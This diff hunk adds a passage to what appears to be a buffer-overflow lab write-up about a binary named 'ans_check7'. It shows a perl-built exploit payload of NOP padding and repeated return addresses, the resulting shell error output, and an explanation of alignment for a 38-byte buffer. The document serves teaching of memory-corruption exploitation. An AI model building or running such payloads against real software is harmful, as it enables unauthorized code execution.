@@ -143,3 +143,17 @@ We are now ready to construct our payload using the addresses we just gathered. 
 $ echo $$
 2366
 ```
+
+I then tried the following input string:
+```bash
+$ ./ans_check7 $(perl -e 'print "\x90"x2, "\x10\x91\x04\x08"x19, "\xee\x92\x04\x08", "\x32\xd8\xff\xff"')
+```
+which produces:
+```console
+sh: 1: <???%>: not found
+sh: 1: <???%>: not found
+sh: 1: <???%>: not found
+sh: 1: <???%>: not found
+sh: 1: j: not found
+```
+Note that the leading two bytes of NOPS are for four-byte alignment requirement, given that our <code>ans_buf</code> has a size of $38$ bytes.
